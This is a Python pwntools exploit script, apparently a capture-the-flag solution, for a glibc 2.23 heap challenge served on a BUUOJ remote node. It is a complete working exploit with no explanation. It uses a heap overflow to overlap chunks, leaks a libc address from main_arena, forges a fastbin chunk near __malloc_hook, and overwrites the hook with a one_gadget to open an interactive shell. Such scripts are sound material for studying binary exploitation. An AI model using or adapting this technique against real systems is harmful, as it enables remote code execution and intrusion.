from pwn import *

#sh=process("./timu")
sh=remote("node5.buuoj.cn",27928)
#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc=ELF("./libc-2.23.so")

def alloc(size):
	sh.recvuntil(b"Command: ")
	sh.sendline(str(1))
	sh.recvuntil(b"Size: ")
	sh.sendline(str(size))

def fill(idx,size,content):
	sh.recvuntil(b"Command: ")
	sh.sendline(str(2))
	sh.recvuntil(b"Index: ")
	sh.sendline(str(idx))
	sh.recvuntil(b"Size: ")
	sh.sendline(str(size))
	sh.recvuntil(b"Content: ")
	sh.sendline(content)

def free(idx):
	sh.recvuntil(b"Command: ")
	sh.sendline(str(3))
	sh.recvuntil(b"Index: ")
	sh.sendline(str(idx))

def show(idx):
	sh.recvuntil(b"Command: ")
	sh.sendline(str(4))
	sh.recvuntil(b"Index: ")
	sh.sendline(str(idx))

alloc(0x10) #0
alloc(0x10) #1
alloc(0x10) #2
alloc(0x10) #3
alloc(0x80) #4
alloc(0x80) #5

free(1)
free(2)

payload=p64(0)*3+p64(0x21)+p64(0)*3+p64(0x21)+b"\x80"
fill(0,len(payload),payload)

payload=p64(0)*3+p64(0x21)
fill(3,len(payload),payload)

alloc(0x10) #1
alloc(0x10) #2

payload=p64(0)*3+p64(0x91)
fill(3,len(payload),payload)

free(4)
show(2)

sh.recvuntil(b"Content: \n")
main_arena=u64(sh.recv(6).ljust(8,b"\x00"))
print("main_arena=",hex(main_arena-88))
libc_base=main_arena-0x3c4b78
print("libc_base=",hex(libc_base))
#gdb.attach(sh)

fake_chunk=main_arena-88-0x33
alloc(0x60) #4
free(4)

payload=p64(fake_chunk)
fill(2,len(payload),payload)

alloc(0x60) #4
alloc(0x60) #6

payload=0x13*b'a'+p64(libc_base+0x4526a)
fill(6,len(payload),payload)
alloc(0x100)
sh.interactive()
